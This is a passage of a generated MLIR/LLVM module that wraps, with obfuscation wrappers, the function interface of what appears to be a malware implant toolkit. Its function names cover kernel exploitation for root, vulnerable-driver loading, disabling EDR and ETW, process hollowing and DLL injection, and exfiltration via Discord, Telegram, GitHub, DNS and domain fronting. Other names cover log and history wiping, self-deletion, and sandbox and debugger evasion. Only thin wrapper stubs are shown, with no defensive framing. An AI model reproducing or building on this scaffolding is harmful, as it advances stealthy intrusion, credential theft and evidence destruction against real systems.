module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, i64 = dense<[32, 64]> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little">, llvm.module_asm = [], llvm.target_triple = ""} {
  llvm.func internal @__obfs_wrap_jocky_ftrace_detach(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_ftrace_detach(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_ftrace_attach(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_ftrace_attach(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_syscall_trace(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_syscall_trace(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_syscall_unhook(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_syscall_unhook(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_syscall_hook(%arg0: i32, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_syscall_hook(%arg0, %arg1) : (i32, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_lkm_get_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_lkm_get_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_lkm_unload(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_lkm_unload(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_lkm_load(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_lkm_load(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_ebpf_run(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i64 {
    %0 = llvm.call @jocky_ebpf_run(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_ebpf_attach(%arg0: i32, %arg1: i32, %arg2: i32) -> i32 {
    %0 = llvm.call @jocky_ebpf_attach(%arg0, %arg1, %arg2) : (i32, i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_ebpf_load(%arg0: !llvm.ptr, %arg1: i32, %arg2: i32) -> i32 {
    %0 = llvm.call @jocky_ebpf_load(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_find_uaf_primitive() -> i32 {
    %0 = llvm.call @jocky_fence2pwn_find_uaf_primitive() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_elevate_to_root() -> i32 {
    %0 = llvm.call @jocky_fence2pwn_elevate_to_root() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_trigger_reclamation() -> i32 {
    %0 = llvm.call @jocky_fence2pwn_trigger_reclamation() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_write_cred(%arg0: !llvm.ptr, %arg1: i32, %arg2: i32) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_write_cred(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_allocate_cred_objects(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_allocate_cred_objects(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_manipulate_creds(%arg0: i32, %arg1: i32) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_manipulate_creds(%arg0, %arg1) : (i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_exploit_uaf(%arg0: i32, %arg1: i32, %arg2: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_exploit_uaf(%arg0, %arg1, %arg2) : (i32, i32, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_trigger_allocations(%arg0: i64, %arg1: i32) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_trigger_allocations(%arg0, %arg1) : (i64, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_get_pool_info(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_fence2pwn_get_pool_info(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_fence2pwn_detect_kfence() -> i32 {
    %0 = llvm.call @jocky_fence2pwn_detect_kfence() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_process_get_maps(%arg0: i32, %arg1: !llvm.ptr, %arg2: i64) -> i32 {
    %0 = llvm.call @jocky_process_get_maps(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i64) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_process_ptrace_detach(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_process_ptrace_detach(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_process_ptrace_attach(%arg0: i32) -> i32 {
    %0 = llvm.call @jocky_process_ptrace_attach(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_process_hollow_linux(%arg0: i32, %arg1: !llvm.ptr, %arg2: i64) -> i1 {
    %0 = llvm.call @jocky_process_hollow_linux(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i64) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_module_resolve_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_module_resolve_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_module_base(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @jocky_module_base(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_module_has_symbol(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_module_has_symbol(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_module_unload(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_module_unload(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_module_load(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @jocky_module_load(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_exfil_local_cdn(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_local_cdn(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_exfil_discord_webhook(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_discord_webhook(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_exfil_dns_tunnel(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @exfil_dns_tunnel(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_blindside_unhook_ntdll() -> i1 {
    %0 = llvm.call @blindside_unhook_ntdll() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_edrhoker_detect() -> i1 {
    %0 = llvm.call @edrhoker_detect() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exploit_token_replacement(%arg0: i32, %arg1: i32) -> i32 {
    %0 = llvm.call @jocky_exploit_token_replacement(%arg0, %arg1) : (i32, i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_exploit_disable_callbacks() -> i32 {
    %0 = llvm.call @jocky_exploit_disable_callbacks() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_btr_mask_module(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @btr_mask_module(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_btr_disable_notifications() -> i1 {
    %0 = llvm.call @btr_disable_notifications() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_byovd_test_exploit(%arg0: i32) -> i32 {
    %0 = llvm.call @byovd_test_exploit(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_byovd_load_driver(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @byovd_load_driver(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_ai_score_threat() -> f64 {
    %0 = llvm.call @ai_score_threat() : () -> f64
    llvm.return %0 : f64
  }
  llvm.func internal @__obfs_wrap_ai_collect_telemetry() -> !llvm.ptr {
    %0 = llvm.call @ai_collect_telemetry() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_ai_init() -> i32 {
    %0 = llvm.call @ai_init() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_provenance_record(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) {
    llvm.call @provenance_record(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_audit_verify() -> i32 {
    %0 = llvm.call @audit_verify() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_audit_export(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @audit_export(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_audit_init(%arg0: i32) -> i1 {
    %0 = llvm.call @audit_init(%arg0) : (i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_audit_log(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
    llvm.call @audit_log(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_registry_close_key(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_registry_close_key(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_set_value(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32, %arg4: i32) -> i1 {
    %0 = llvm.call @jocky_registry_set_value(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_registry_create_key(%arg0: i32, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_registry_create_key(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_export_trace(%arg0: i32, %arg1: !llvm.ptr) -> i1 {
    %0 = llvm.call @sandbox_export_trace(%arg0, %arg1) : (i32, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_wait(%arg0: i32) -> i32 {
    %0 = llvm.call @sandbox_wait(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_sandbox_monitor(%arg0: i32) -> i32 {
    %0 = llvm.call @sandbox_monitor(%arg0) : (i32) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_sandbox_set_limits(%arg0: i32, %arg1: i64, %arg2: i32, %arg3: i64) -> i1 {
    %0 = llvm.call @sandbox_set_limits(%arg0, %arg1, %arg2, %arg3) : (i32, i64, i32, i64) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_sandbox_spawn(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> i32 {
    %0 = llvm.call @sandbox_spawn(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_crypto_aes256_decrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @crypto_aes256_decrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_crypto_aes256_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @crypto_aes256_encrypt(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_crypto_generate_key(%arg0: i32) -> !llvm.ptr {
    %0 = llvm.call @crypto_generate_key(%arg0) : (i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_write_file(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> i1 {
    %0 = llvm.call @fs_write_file(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_fs_read_file(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @fs_read_file(%arg0) : (!llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_file_size(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @fs_file_size(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_fs_list_files(%arg0: !llvm.ptr, %arg1: i1) -> !llvm.ptr {
    %0 = llvm.call @fs_list_files(%arg0, %arg1) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_fs_exists(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @fs_exists(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_usn_journal() -> i32 {
    %0 = llvm.call @jocky_cleanup_usn_journal() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_event_logs(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_cleanup_event_logs(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_journal() -> i32 {
    %0 = llvm.call @jocky_linux_cleanup_journal() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_linux_cleanup_syslog() -> i32 {
    %0 = llvm.call @jocky_linux_cleanup_syslog() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_linux_forensics_wipe_bash_history() -> i32 {
    %0 = llvm.call @linux_forensics_wipe_bash_history() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_clear_dns_cache() -> i32 {
    %0 = llvm.call @forensics_clear_dns_cache() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_flush_arp_cache() -> i32 {
    %0 = llvm.call @forensics_flush_arp_cache() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_wipe_cmd_history() -> i32 {
    %0 = llvm.call @forensics_wipe_cmd_history() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_forensics_wipe_powershell_history() -> i32 {
    %0 = llvm.call @forensics_wipe_powershell_history() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_cleanup_all() {
    llvm.call @jocky_cleanup_all() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_clear_srum() -> i1 {
    %0 = llvm.call @jocky_clear_srum() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_patch_amcache() -> i1 {
    %0 = llvm.call @jocky_patch_amcache() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_patch_shimcache() -> i1 {
    %0 = llvm.call @jocky_patch_shimcache() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_prefetch() {
    llvm.call @jocky_wipe_prefetch() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_wipe_artifacts(%arg0: !llvm.ptr) {
    llvm.call @jocky_wipe_artifacts(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_clear_logs() {
    llvm.call @jocky_clear_logs() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_self_delete() {
    llvm.call @jocky_self_delete() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_github(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_github(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_telegram(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_telegram(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_discord(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_discord(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_dns(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_dns(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_front(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr, %arg4: i32) -> i1 {
    %0 = llvm.call @jocky_exfil_front(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_exfil_encrypt(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
    llvm.call @jocky_exfil_encrypt(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_thread_hijack(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_thread_hijack(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_rdll_inject(%arg0: i32, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_rdll_inject(%arg0, %arg1, %arg2) : (i32, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_module_stomp(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_module_stomp(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_process_hollow(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i32) -> i1 {
    %0 = llvm.call @jocky_process_hollow(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_elevate_token(%arg0: !llvm.ptr, %arg1: i32) -> i1 {
    %0 = llvm.call @jocky_elevate_token(%arg0, %arg1) : (!llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_disable_etw(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_disable_etw(%arg0) : (!llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_disable_edr_callbacks(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_disable_edr_callbacks(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_kwrite(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_kwrite(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_kread(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_kread(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_driver_map_kernel(%arg0: !llvm.ptr, %arg1: i64, %arg2: i32) -> !llvm.ptr {
    %0 = llvm.call @jocky_driver_map_kernel(%arg0, %arg1, %arg2) : (!llvm.ptr, i64, i32) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_driver_write_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_driver_write_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_driver_read_phys(%arg0: !llvm.ptr, %arg1: i64, %arg2: !llvm.ptr, %arg3: i32) -> i1 {
    %0 = llvm.call @jocky_driver_read_phys(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i64, !llvm.ptr, i32) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_unload(%arg0: !llvm.ptr) {
    llvm.call @jocky_byovd_unload(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_load(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr) -> i1 {
    %0 = llvm.call @jocky_byovd_load(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_spoof_syscall(%arg0: i32, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
    %0 = llvm.call @jocky_spoof_syscall(%arg0, %arg1, %arg2, %arg3, %arg4) : (i32, i64, i64, i64, i64) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_spoof_call(%arg0: !llvm.ptr, %arg1: i64, %arg2: i64, %arg3: i64, %arg4: i64) -> i64 {
    %0 = llvm.call @jocky_spoof_call(%arg0, %arg1, %arg2, %arg3, %arg4) : (!llvm.ptr, i64, i64, i64, i64) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_jocky_get_syscall_number(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.call @jocky_get_syscall_number(%arg0) : (!llvm.ptr) -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_unhook_ntdll() -> i1 {
    %0 = llvm.call @jocky_unhook_ntdll() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_decrypt_rc4(%arg0: !llvm.ptr, %arg1: i32, %arg2: !llvm.ptr, %arg3: i32) {
    llvm.call @jocky_decrypt_rc4(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_decrypt_xor(%arg0: !llvm.ptr, %arg1: i32, %arg2: i8, %arg3: i32) {
    llvm.call @jocky_decrypt_xor(%arg0, %arg1, %arg2, %arg3) : (!llvm.ptr, i32, i8, i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_sleep_and_recheck() {
    llvm.call @jocky_sleep_and_recheck() : () -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_is_sandbox() -> i1 {
    %0 = llvm.call @jocky_is_sandbox() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_is_vm() -> i1 {
    %0 = llvm.call @jocky_is_vm() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_is_debugger_present() -> i1 {
    %0 = llvm.call @jocky_is_debugger_present() : () -> i1
    llvm.return %0 : i1
  }
  llvm.func internal @__obfs_wrap_jocky_check_analysis_environment() -> i32 {
    %0 = llvm.call @jocky_check_analysis_environment() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_runtime_init() -> i32 {
    %0 = llvm.call @jocky_runtime_init() : () -> i32
    llvm.return %0 : i32
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_destroy(%arg0: !llvm.ptr) {
    llvm.call @jocky_byovd_destroy(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_byovd_new() -> !llvm.ptr {
    %0 = llvm.call @jocky_byovd_new() : () -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_jocky_free(%arg0: !llvm.ptr) {
    llvm.call @jocky_free(%arg0) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_jocky_alloc(%arg0: i64) -> !llvm.ptr {
    %0 = llvm.call @jocky_alloc(%arg0) : (i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_array_append(%arg0: !llvm.ptr, %arg1: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.call @array_append(%arg0, %arg1) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_array_len(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @array_len(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_exit(%arg0: i32) {
    llvm.call @exit(%arg0) : (i32) -> ()
    llvm.return
  }
  llvm.func internal @__obfs_wrap_strlen(%arg0: !llvm.ptr) -> i64 {
    %0 = llvm.call @strlen(%arg0) : (!llvm.ptr) -> i64
    llvm.return %0 : i64
  }
  llvm.func internal @__obfs_wrap_memcpy(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: i64) -> !llvm.ptr {
    %0 = llvm.call @memcpy(%arg0, %arg1, %arg2) : (!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_memset(%arg0: !llvm.ptr, %arg1: i32, %arg2: i64) -> !llvm.ptr {
    %0 = llvm.call @memset(%arg0, %arg1, %arg2) : (!llvm.ptr, i32, i64) -> !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.func internal @__obfs_wrap_free(%arg0: !llvm.ptr) {
    llvm.call @free(%arg0) : (!llvm.ptr) -> ()
